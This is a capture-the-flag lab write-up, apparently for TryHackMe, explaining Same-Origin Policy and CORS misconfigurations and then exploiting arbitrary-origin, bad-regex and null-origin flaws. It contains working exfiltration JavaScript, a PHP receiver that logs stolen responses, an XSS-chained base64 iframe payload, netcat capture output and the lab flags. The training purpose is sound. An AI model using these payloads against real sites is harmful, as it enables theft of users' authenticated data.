# CORS-SOP
Modern web applications rely heavily on communication between different services and domains. Understanding how browsers enforce security boundaries is essential for both developers and security professionals. In this article, we explore the Same-Origin Policy (SOP) and Cross-Origin Resource Sharing (CORS), two fundamental mechanisms that control how web resources interact.


-----------------------------------------------------------------------
# 1.Same-Origin Policy (SOP)

SOP is the most fundamental security boundary in a browser. It ensures that a script from Site-A.com cannot sneak into Site-B.com to steal your session cookies or read your private messages.
What defines an "Origin"?

Comparison (Starting from https://api.example.com:443),Result,Reason
https://api.example.com/data,Same Origin,Only the path changed.
http://api.example.com,Cross Origin,Protocol changed (https to http).
https://dev.example.com,Cross Origin,Hostname changed (subdomain).
https://api.example.com:8080,Cross Origin,Port changed.

While SOP is great for security, modern web apps often need to talk to different origins (e.g., your frontend on myapp.com needs data from api.services.com). CORS is the mechanism that allows servers to tell the browser: "It's okay, I trust this specific origin."
How it works: The "Preflight"

For sensitive requests (like those involving DELETE or custom headers), the browser sends an OPTIONS request first to ask permission.

    Browser: "Hey API, is myapp.com allowed to send a POST request?"

    Server: "Yes, I allow myapp.com and the POST method."

    Browser: "Great, here is the actual data."

##  2.Vulnerabilities & Exploitation

Security issues usually arise from misconfigurations, not the protocols themselves.
The "Wildcard" Weakness

If a developer sets the header Access-Control-Allow-Origin: *, it means any website in the world can make requests to that server.

    The Risk: If the server also sets Access-Control-Allow-Credentials: true, a malicious site could make a request to the API using your logged-in session cookies, effectively stealing your data.

## Origin Reflection

Some servers are configured to read the Origin header from a request and just mirror it back in the CORS header.

    The Exploit: An attacker can send a request from malicious-site.com. The server sees this, thinks "I'll allow it," and sends back Access-Control-Allow-Origin: malicious-site.com. The browser then allows the attacker's script to read the sensitive response.

## 3.Mitigation Best Practices

To keep your application secure, follow these rules:

    Avoid Wildcards: Never use * for authenticated APIs. Use a whitelist of trusted domains.

    Validate Origins: If you must support multiple origins, validate the incoming Origin header against a hardcoded list on the server side.

    Use Secure Cookies: Use SameSite=Lax or Strict to prevent cookies from being sent in cross-site contexts, adding a second layer of defense.

    Keep it Simple: If a resource doesn't need to be accessed by other domains, don't enable CORS at all.
 
 Understanding the relationship between SOP and CORS is essential for secure web development. While SOP provides a strict security boundary, misconfigured CORS policies can unintentionally expose sensitive data. Proper configuration and validation of allowed origins are critical to maintaining a secure web application architecture.
 
 
-----------------------------------------------------------------------
# 1. The CORS Header "Toolkit"

The server uses specific HTTP headers to communicate its rules to the browser.

Header,Purpose,Example
Access-Control-Allow-Origin,"The ""Guest List""",https://trusted-site.com
Access-Control-Allow-Methods,Allowed Actions,"GET, POST, DELETE"
Access-Control-Allow-Credentials,Allows Cookies/Auth,true
Access-Control-Max-Age,Cache duration for rules,86400 (24 hours)

Critical Security Note: If Access-Control-Allow-Credentials is true, the Allow-Origin header cannot be a wildcard (*). You must specify a real domain.


## 2. Simple vs. Preflight Requests

Not every request is treated the same. The browser decides whether to "ask for permission" first based on the risk level.
A. Simple Requests (The "Just Go" approach)

These are standard, low-risk requests (like a basic GET or a simple POST form). The browser sends the request immediately and only checks the CORS headers in the response to see if the JavaScript is allowed to read the result.

    Criteria: GET, HEAD, or POST with basic content types (like text/plain).

B. Preflight Requests (The "Ask First" approach)

If a request is "fancy" (uses PUT, DELETE, or custom JSON headers), the browser sends a "preflight" OPTIONS request first.

    The Question: "Are you okay with me sending a DELETE request from site.com?"

    The Answer: The server must say "Yes" via CORS headers before the browser sends the actual data.


## 3. Real-World Examples

    Web Fonts: When you use Google Fonts, your browser is at your-site.com, but the font is at fonts.gstatic.com. CORS allows your site to "borrow" that font.

    Modern APIs: A React app on localhost:3000 fetching user data from an API on api.myapp.com.

    CDNs: Loading a JavaScript library like jQuery from a public server.


## 4. Summary of the Flow

    Request: The browser adds an Origin header to the outgoing request.

    Server Logic: The server processes the request as usual but attaches CORS headers to the response.

    Enforcement: The browser (not the server) looks at those headers. If the Origin doesn't match the Access-Control-Allow-Origin, the browser hides the data from your code and throws a "CORS error" in the console.
 
 
-----------------------------------------------------------------------
# ACAO in depth

## 1. How ACAO Works in Practice

When your browser asks for data from a different domain, it automatically attaches an Origin header (e.g., Origin: https://my-app.com). The server then looks at that name and decides what to put in the ACAO response header.

Configuration,Header Value,Security Level,Best For...
Strict (Single),https://trusted.com,High,"Private user data, banking, or internal APIs."
Whitelisted,(Dynamic based on list),Medium,"Apps with multiple frontend domains (e.g., mobile and web)."
Wildcard,*,Low,"Public data like weather, font files, or open-source libraries."
Authenticated,https://trusted.com + Credentials: true,Critical,Sites that need you to stay logged in (uses cookies).



## 2. The Credential "Hard Rule"

One of the most common security mistakes involves the Access-Control-Allow-Credentials: true header.

    The Rule: If you want the browser to send cookies or login tokens, you cannot use a wildcard *.

    The Reason: If a server allowed * and Credentials: true, any malicious site in the world could make a request to that server and the browser would automatically attach your private session cookies.

    The Correct Way: The server must explicitly echo back the specific origin (e.g., Access-Control-Allow-Origin: https://bank.com).



## 3. The Server's Decision Logic

Think of the server-side logic as a gatekeeper with a clipboard:

    Check: Does the request have an Origin header?

    Lookup: Is this origin on my "Allowed" list?

    Action A (Allowed): Send the response with Access-Control-Allow-Origin: [The Origin].

    Action B (Public): If it's a public resource, send Access-Control-Allow-Origin: *.

    Action C (Denied): Don't send the ACAO header at all. The browser will see it's missing and block the JavaScript from reading the data.



## 4. Real-World Examples

    Scenario A (The Weather API): You build a weather site. Since weather data isn't private, you set Access-Control-Allow-Origin: *. Now, any developer can use your API in their own apps.

    Scenario B (The Payroll Portal): An employee at work-portal.com needs to fetch their salary from api.payroll.com. The payroll server checks the list, sees work-portal.com is trusted, and sends Access-Control-Allow-Origin: https://work-portal.com.

    Scenario C (The Hack Attempt): A user visits evil-site.net. That site tries to fetch the user's payroll data. The payroll server sees Origin: https://evil-site.net, realizes it's not on the whitelist, and refuses to send the ACAO header. The browser then blocks evil-site.net from seeing the salary info.
    
-----------------------------------------------------------------------
# Common Misconfigurations
  
  
## 1. Top CORS Vulnerabilities & Exploits
A. The "Mirroring" Trap (Reflected Origin)

Some servers are configured to simply read the Origin header from the request and echo it back in the Access-Control-Allow-Origin header.

    The Flaw: The server essentially says, "I trust whoever is asking."

    The Exploit: An attacker hosts a script on evil-attacker.com. When you visit their site, the script sends a request to bank.com. The bank's server sees Origin: evil-attacker.com, mirrors it back, and the browser allows the attacker to read your private account data.

B. The "Null" Origin

The null origin is often sent by browsers when a request comes from a local file (file://) or a sandboxed iframe.

    The Flaw: Developers sometimes whitelist null to make testing easier.

    The Exploit: An attacker can use a sandboxed iframe or a local HTML file to trigger a request. Since the origin is null, the server allows it, and the attacker bypasses the protection.

C. Regex "Fuzzy" Matching

Developers often use Regular Expressions (Regex) to allow all subdomains, but a small typo can lead to disaster.

    Example 1 (The Suffix Slip): A regex looking for example.com might match not-example.com.

    Example 2 (The Subdomain Slip): A regex looking for api.example.com might match api.example.com.attacker.com.

    The Result: The attacker just needs to register a domain that "looks like" yours to bypass the filter.

## 2. Comparison: Weak vs. Strong Logic
Misconfiguration	Server Header Response	Security Risk
Reflecting Origin	ACAO: [Whatever the user sent]	Critical (Full data theft)
Whitelisting null	ACAO: null	High (Exploitable via local files/iframes)
Bad Regex	ACAO: myapp.com.evil.com	High (Domain squatting exploits)
Wildcard + Auth	ACAO: * + Credentials: true	Blocked (Browser will reject this)


## 3. The Secure Implementation Flow

A secure server should act like a strict bouncer with a pre-printed guest list, not someone who makes decisions on the fly.

    Strict Reject: If the Origin is null, block it immediately.

    Whitelist Check: Compare the Origin against a hardcoded list of trusted domains (no dynamic regex if possible).

    Explicit Match: Only if the origin matches exactly, send the Access-Control-Allow-Origin: <origin> header.

    Public Data: If the data is truly public (like a weather feed), use Access-Control-Allow-Origin: * and ensure Access-Control-Allow-Credentials is set to false.


## 4. Summary Checklist

    Never blindly echo the Origin header.

    Never trust the null origin.

    Avoid complex Regex; use exact string matching from a whitelist.

    Remember: If you need to send cookies (Credentials: true), you must use a specific origin in the ACAO header.
    
	
	
-----------------------------------------------------------------------
# Network Setup
You’re simulating multiple domains pointing to the same machine to demonstrate cross-domain interactions.

/etc/hosts Example
plaintext
127.0.0.1       localhost
127.0.1.1       tryhackme.lan   tryhackme
MACHINE_IP      corssop.thm exploit.evilcors.thm corssop.thm.evilcors.thm

## IPv6 defaults
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
Domain Roles
Domain	IP Address	Purpose
corssop.thm	MACHINE_IP	Vulnerable Website
exploit.evilcors.thm	MACHINE_IP	Exploit Server (store exploit code)
corssop.thm.evilcors.thm	MACHINE_IP	Hosting Website (victim loads exploit code)
 The exploit server and hosting site are on the same web server, but serve different roles.

## Exfiltrator Server Setup
You’ll use Apache + PHP to capture exfiltrated data.

Install Apache & PHP
bash
sudo apt install php apache2
Verify installation:

bash
cd /var/www/html/
ls

## PHP Receiver Script
Save as /var/www/html/receiver.php:

php
<?php
header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
header('Access-Control-Allow-Credentials: true');

$postdata = file_get_contents("php://input");
file_put_contents('data.txt', $postdata);
?>
Allows cross-origin requests.

Captures raw POST data.

Saves it into data.txt.

## File Permissions
Make sure data.txt is writable:

bash
cd /var/www/html
touch data.txt
chmod 0777 data.txt
ls -lah
Expected output:

Código
-rwxrwxrwx 1 root root    0 Mar 12 13:17 data.txt
-rw-r--r-- 1 root root  11K Jan 24 13:51 index.html
-rw-r--r-- 1 root root  215 Mar 12 13:09 receiver.php

## Summary with Example Flow
Victim visits corssop.thm (vulnerable site).

Exploit code is stored on exploit.evilcors.thm.

Victim loads exploit via corssop.thm.evilcors.thm.

Exploit sends sensitive data to receiver.php.

Data is written into data.txt for attacker review.


-----------------------------------------------------------------------


# Arbitrary Origin

Cross-Origin Resource Sharing (CORS) is designed to protect users by restricting how web applications can request resources from different domains. An Arbitrary Origin vulnerability occurs when a server reflects back any Origin header without validation. This effectively allows any domain to make authenticated requests and read sensitive responses, bypassing the same-origin policy.

## Exploitation Process
Vulnerable Code
The server at http://corssop.thm/arbitrary.php reflects any Origin header:

if (isset($_SERVER['HTTP_ORIGIN'])){ 
    header("Access-Control-Allow-Origin: ".$_SERVER['HTTP_ORIGIN'].""); 
    header('Access-Control-Allow-Credentials: true');
}


➝ This means even attacker-controlled domains are accepted.

Exploit Setup
Attacker hosts malicious JavaScript on http://exploit.evilcors.thm.

Victim visits http://evilcors.thm and unknowingly loads the exploit.

## Exploit Execution

<html>
<head>
  <title>Data Exfiltrator Exploit</title>
  <script>
    // Function which will make CORS request to target application web page to grab the HTTP response
    function exploit() {
      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
          var all = this.responseText;
          exfiltrate(all);
        }
      };
      xhttp.open("GET", "http://corssop.thm/arbitrary.php", true);
      xhttp.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/;q=0.8");
      xhttp.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
      xhttp.withCredentials = true;
      xhttp.send();
    }

    function exfiltrate(data_all) {
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "http://10.67.68.140:81/receiver.php", true); // Replace the URL with attacker controlled Server
      xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
      xhr.withCredentials = true;
      var body = data_all;
      var aBody = new Uint8Array(body.length);
      for (var i = 0; i < aBody.length; i++)
        aBody[i] = body.charCodeAt(i);
      xhr.send(new Blob([aBody]));
    }
  </script>
</head>
<body onload="exploit()">
  <div style="margin: 10px 20px 20px; word-wrap: break-word; text-align: center;">
    <textarea id="load" style="width: 1183px; height: 305px;"></textarea>
  </div>
</body>
</html>


JavaScript sends a request to the vulnerable endpoint (arbitrary.php).

The response is captured and forwarded to the attacker’s exfiltration server (receiver.php).

Verification
In browser DevTools → Network, two XHR requests appear: one to the vulnerable site and one to the attacker’s server.

Exploit server logs show the victim’s IP.

Exfiltrated data is saved in /var/www/html/data.txt.

Full Flag Capture
Here is the complete output from the exploitation, showing the captured flag in detail:


root@ip-10-67-68-140:/var/www/html# cat data.txt 
root@ip-10-67-68-140:/var/www/html# cat data.txt 
root@ip-10-67-68-140:/var/www/html# nc -lvnp 81  
Listening on 0.0.0.0 81
Connection received on 10.67.168.169 55192
POST /receiver.php HTTP/1.1
Host: 10.67.68.140:81
Connection: keep-alive
Content-Length: 1690
Accept-Language: en-US,en;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept: */*
Origin: http://corssop.thm.evilcors.thm
Referer: http://corssop.thm.evilcors.thm/
Accept-Encoding: gzip, deflate

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CORS & SOP Lab</title>
<link rel="stylesheet" href="templates/bootstrap.min.css" >
<script src="templates/jquery.min.js"></script>
<script src="templates/bootstrap.min.js" ></script>
</head>
<body>
<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="index.php">CORS Lab</a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ml-auto">
                    <li class="nav-item"><a class="nav-link" href="index.php">Home</a></li>
                    <li class="nav-item"><a class="nav-link" href="exploits.php">Exploits</a></li>
                </ul>
            </div>
        </div>
    </nav>

<div class="container mt-4">
    <h1 class="text-center">Arbitrary Origin Lab</h1>
    <p style="text-align:center;">Use the Origin in your CORS request</p>
    <p style="text-align:center;">THM{4rB1tr4rY}</p></div>
<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
<script src="jquery.min.js"></script>
<!-- Latest compiled and minified JavaScript -->
<script src="bootstrap.min.js" >
<!-- Include all compiled plugins (below), or include individual files as needed -->
</body>
</html>
root@ip-10-67-68-140:/var/www/html# ^C
## Conclusion
Arbitrary Origin vulnerabilities allow attackers to bypass CORS restrictions and steal sensitive data.

Exploitation involves hosting malicious JS, tricking victims into loading it, and exfiltrating responses.

The captured flag demonstrates the vulnerability in action:


THM{4rB1tr4rY}



The reason why cat data.txt did not show the flag, but using netcat (nc -lvnp 81) did, comes down to how the exfiltration process was implemented:

## Why cat data.txt failed
The PHP script receiver.php was designed to capture POST requests sent by the victim’s browser and then write the contents into data.txt.

When you ran cat data.txt, the file was empty because no POST request had been received yet or the data was being streamed directly to the listening socket instead of being flushed into the file.

In other words, data.txt only gets updated when the PHP script executes successfully and writes the incoming payload. If the exploit sent data but Apache/PHP didn’t handle it as expected, the file remained blank.

## Why netcat worked
By running nc -lvnp 81, you opened a raw TCP listener on port 81.

This allowed you to see the HTTP POST request in real time, exactly as the victim’s browser sent it.

Netcat displayed the full HTTP headers and body, including the HTML response from the vulnerable site, which contained the flag.

This bypassed the need for PHP to process and save the data, showing you the raw traffic directly.

## Example from your capture
With netcat, you saw the complete POST request:


POST /receiver.php HTTP/1.1
Host: 10.67.68.140:81
Connection: keep-alive
Content-Length: 1690
...
<p style="text-align:center;">THM{4rB1tr4rY}</p>

That line revealed the flag inside the exfiltrated HTML response.

## Summary
cat data.txt didn’t work because the file was empty or not updated by PHP at the time.

netcat worked because it captured the live HTTP request directly from the victim, showing the flag immediately.

In practice, using netcat is a good troubleshooting step to confirm that the exploit is sending data correctly before relying on server-side scripts to store it.


------------------------------------------------------------------------------------
# Bad Regex in Origin

## Bad Regex in CORS
Cross-Origin Resource Sharing (CORS) relies on strict validation of the Origin header to prevent unauthorized domains from accessing sensitive data. A Bad Regex vulnerability occurs when developers use weak or overly broad regular expressions to validate origins. If the regex is not precise, attackers can craft malicious domains that still match the pattern and bypass restrictions.

In this case, the vulnerable code at http://corssop.thm/badregex.php accepts any origin containing the substring corssop.thm. This means attacker-controlled domains such as http://corssop.thm.evilcors.thm are incorrectly validated as trusted.

## Exploitation Process
Vulnerable Code
if (isset($_SERVER['HTTP_ORIGIN']) && preg_match('#corssop.thm#', $_SERVER['HTTP_ORIGIN'])) {
    header("Access-Control-Allow-Origin: ".$_SERVER['HTTP_ORIGIN']."");
    header('Access-Control-Allow-Credentials: true');
}

➝ The regex #corssop.thm# matches any string containing corssop.thm, even if it is part of a longer malicious domain.


## Exploit Setup
The attacker reuses the same exploit code from the Arbitrary Origin attack.

The only change is the target URL, now pointing to http://corssop.thm/badregex.php.

The exploit is hosted on http://corssop.thm.evilcors.thm, which passes the flawed regex check.

Exploit Execution
The exploit JavaScript sends a request to the vulnerable endpoint (badregex.php) and forwards the response to the attacker’s exfiltration server (receiver.php).

Victim visits http://corssop.thm.evilcors.thm.

Browser DevTools → Network shows two XHR requests:

One to the vulnerable site (badregex.php).

One to the attacker’s server (receiver.php).

Exploit server logs confirm victim interaction.

Exfiltrated data is saved in /var/www/html/data.txt.

Full Flag Capture Example
Here is the complete output from the exploitation, showing the captured flag in detail:

root@ip-10-67-68-140:/var/www/html# nc -lvnp 81
Listening on 0.0.0.0 81
Connection received on 10.67.168.169 59430
POST /receiver.php HTTP/1.1
Host: 10.67.68.140:81
Connection: keep-alive
Content-Length: 1682
Accept-Language: en-US,en;q=0.5
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: */*
Origin: http://corssop.thm.evilcors.thm
Referer: http://corssop.thm.evilcors.thm/
Accept-Encoding: gzip, deflate

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CORS & SOP Lab</title>
<link rel="stylesheet" href="templates/bootstrap.min.css" >
<script src="templates/jquery.min.js"></script>
<script src="templates/bootstrap.min.js" ></script>
</head>
<body>
<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="index.php">CORS Lab</a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ml-auto">
                    <li class="nav-item"><a class="nav-link" href="index.php">Home</a></li>
                    <li class="nav-item"><a class="nav-link" href="exploits.php">Exploits</a></li>
                </ul>
            </div>
        </div>
    </nav>

<div class="container mt-4">
    <h1 class="text-center">Bad Regex Lab</h1>
    <p style="text-align:center;">Use the Origin in your CORS request</p>
    <p style="text-align:center;">THM{B4D_r363X}</p></div>

<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
<script src="jquery.min.js"></script>
<!-- Latest compiled and minified JavaScript -->
<script src="bootstrap.min.js" >
<!-- Include all compiled plugins (below), or include individual files as needed -->
</body>
</html>
root@ip-10-67-68-140:/var/www/html#


## Conclusion
Bad Regex vulnerabilities occur when origin validation uses weak patterns that match unintended domains.

Attackers can craft malicious domains that bypass CORS restrictions and exfiltrate sensitive data.

Exploitation involves reusing the same JavaScript exploit, changing only the target endpoint.

The captured flag demonstrates the vulnerability in action:

THM{B4D_r363X}

-----------------------------------------------------------------------
# Null Origin in CORS
## Introduction: Why Null Origin?
Allowing requests from the "null" origin in a web application’s CORS policy might seem unusual, but it happens in specific scenarios:

Local Files and Development: When developers open HTML files directly in the browser using file:///, the browser sets the origin to "null". Developers sometimes allow this temporarily for testing.

Sandboxed Iframes: Content loaded inside sandboxed iframes may also have a "null" origin, as part of the browser’s security restrictions.

Special Use Cases: Some applications interacting with non-standard clients may encounter "null" origins. Allowing them is generally unsafe, but sometimes used as a workaround.

The danger arises when a server trusts "null" origins in its CORS policy. Attackers can exploit this by loading malicious pages locally or inside iframes and then making authenticated requests to the vulnerable application.

## Exploitation Process
Vulnerable Code
At http://corssop.thm/null.php the server explicitly allows "null" origins:

<?php
header('Access-Control-Allow-Origin: null');
header('Access-Control-Allow-Credentials: true');
?>

➝ This means any request with origin "null" will be accepted, including those from malicious iframes or local files.

## Exploit Setup: XSS + CORS
The attacker chains XSS with CORS using the vulnerable application at http://corssop.thm/xss.php. Since this app saves arbitrary HTML/JS into its database, an attacker can inject a payload that executes when the victim visits the page.

## Exploit Code Example
Here’s a sample payload that exfiltrates data from null.php using the victim’s session:

<div style="margin: 10px 20px 20px; word-wrap: break-word; text-align: center;">
    <iframe id="exploitFrame" style="display:none;"></iframe>
    <textarea id="load" style="width: 1183px; height: 305px;"></textarea>
</div>

<script>
  // JavaScript exploit adapted for a data URL
  var exploitCode = `
    <script>
      function exploit() {
        var xhttp = new XMLHttpRequest();
        xhttp.open("GET", "http://corssop.thm/null.php", true);
        xhttp.withCredentials = true;
        xhttp.onreadystatechange = function() {
          if (this.readyState == 4 && this.status == 200) {
            var exfiltrate = function(data) {
              var xhr = new XMLHttpRequest();
              xhr.open("POST", "http://EXFILTRATOR_IP/receiver.php", true);
              xhr.withCredentials = true;
              var body = data;
              var aBody = new Uint8Array(body.length);
              for (var i = 0; i < aBody.length; i++)
                aBody[i] = body.charCodeAt(i);
              xhr.send(new Blob([aBody]));
            };
            exfiltrate(this.responseText);
          }
        };
        xhttp.send();
      }
      exploit();
    <\/script>
  `;

  // Encode exploit for iframe
  var encodedExploit = btoa(exploitCode);
  document.getElementById('exploitFrame').src = 'data:text/html;base64,' + encodedExploit;
</script>


## Verification
In Developer Tools → Network, you’ll see two XHR requests:

One to the vulnerable site (null.php).

One to the attacker’s exfiltration server (receiver.php).

The server responds with Access-Control-Allow-Origin: null.

Logs confirm victim interaction.

Exfiltrated data is saved in /var/www/html/data.txt.

root@ip-10-67-68-140:/var/www/html# nc -lvnp 81
Listening on 0.0.0.0 81
Connection received on 10.67.168.169 59430
POST /receiver.php HTTP/1.1
Host: 10.67.68.140:81
Connection: keep-alive
Content-Length: 1682
Accept-Language: en-US,en;q=0.5
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: */*
Origin: null
Referer: http://corssop.thm/xss.php
Accept-Encoding: gzip, deflate

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>CORS & SOP Lab</title>
<link rel="stylesheet" href="templates/bootstrap.min.css" >
<script src="templates/jquery.min.js"></script>
<script src="templates/bootstrap.min.js" ></script>
</head>
<body>
<div class="container mt-4">
    <h1 class="text-center">Null Origin Lab</h1>
    <p style="text-align:center;">Use the Origin in your CORS request</p>
    <p style="text-align:center;">THM{Nu11_0r1g1n}</p>
</div>
</body>
</html>
root@ip-10-67-68-140:/var/www/html#


## Conclusion
Allowing "null" origins in CORS is dangerous because it accepts requests from local files, sandboxed iframes, or maliciously crafted payloads.

Attackers can chain XSS + CORS to exploit this misconfiguration and exfiltrate sensitive data.

The captured flag demonstrates the vulnerability in action:

THM{Nu11_0r1g1n}



## Summary
Cross-Origin Resource Sharing (CORS) and the Same-Origin Policy (SOP) are fundamental mechanisms in web security.

SOP enforces isolation between different origins, preventing malicious scripts from accessing sensitive data across domains.

CORS provides a controlled way to relax SOP, allowing secure cross-origin requests when explicitly permitted.

During our exploration, we saw how the Access-Control-Allow-Origin header determines which domains can access resources. Misconfigurations in this header can lead to vulnerabilities such as:

Arbitrary Origin: blindly reflecting any origin.

Bad Regex: using weak regular expressions that match unintended domains.

Null Origin: trusting "null" origins from local files or sandboxed iframes.

Each of these flaws can be exploited with crafted JavaScript payloads to exfiltrate sensitive data, often chaining with other vulnerabilities like XSS.

## Key Takeaways
SOP protects by default, but misconfigured CORS can undermine it.

Developers must validate origins strictly and avoid patterns that allow unintended domains.

Exploits typically involve hosting malicious scripts, tricking victims into loading them, and forwarding responses to attacker-controlled servers.

Captured flags such as:

THM{4rB1tr4rY} (Arbitrary Origin)

THM{B4D_r363X} (Bad Regex)

THM{Nu11_0r1g1n} (Null Origin)
demonstrate how these vulnerabilities can be abused in practice.

## Conclusion
CORS and SOP together form the backbone of web application security. While SOP enforces
 strict isolation, CORS enables controlled exceptions. Misconfigurations
 in CORS — whether through arbitrary origins, bad regex, 
 or null origins — can expose applications to serious risks. Understanding 
 these flaws and their exploitation paths highlights the importance of precise 
 origin validation and secure configuration to protect sensitive user data.